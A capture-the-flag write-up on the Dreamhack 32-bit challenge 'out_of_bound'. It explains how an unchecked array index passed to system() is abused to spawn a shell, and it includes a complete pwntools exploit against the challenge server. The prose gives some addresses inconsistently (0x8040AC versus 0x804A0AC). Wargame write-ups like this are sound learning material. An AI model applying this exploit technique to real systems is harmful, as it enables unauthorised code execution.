+++
date = '2026-05-04'
draft = false
title = 'Dreamhack out_of_bound Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++

## Challenge overview

이 문제는 서버에서 작동하고 있는 서비스(out_of_bound)의 바이너리와 소스 코드가 주어집니다.
프로그램의 취약점을 찾고 익스플로잇해 셸을 획득하세요.
"flag" 파일을 읽어 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.

---

And it's 32 bit!

## Identifying the vulnerabilities

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _DWORD v4[3]; // [esp+8h] [ebp-10h] BYREF

  v4[1] = __readgsdword(0x14u);
  initialize();
  printf("Admin name: ");
  read(0, &name, 16u);
  printf("What do you want?: ");
  __isoc99_scanf("%d", v4);
  system((&command)[v4[0]]);
  return 0;
}
```



At `.bss :0804A0AC` is public name and at `.data:0804A060` is command. 

If we somehow make admin name point to '/bin/sh', and reach it from command, we can spawn a shell.

![challenge-screenshot](data.png#center)

So basically:

- `command[0] = command`

- `command[1] = command + 4`

- `command[2] = command + 4*2`


And we need `command + 4c` = `command + 4 * 0x13 (hex)` = `command + 19`.

![challenge-screenshot](naspa.png#center)

I thought that it was using the address of admin name as a pointer, but it was just taking it's value. 

So we need to input in *admin name* something that points to `/bin/sh\x00`. And, how about we make that ourselves? I mean, we can have it look like this:

`0x8040AC: 0x8040AC + 4`

`0x8040B0: '/bin/sh\x00'`

So that `0x8040AC` points to the immediate next value, being `/bin/sh\x00`.

I changed it in my exploit, and it worked!

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/oob/out_of_bound')
p=elf.process()

#context.arch = 'amd64'
cyberedu = '34.185.222.215:30484'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
admin = p32(0x804A0B0) + b"/bin/sh\x00"
p.recvuntil(b": ")
p.sendline(admin)
p.recvuntil(b": ")
p.sendline(b"19")

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/out_of_bound.py)**.
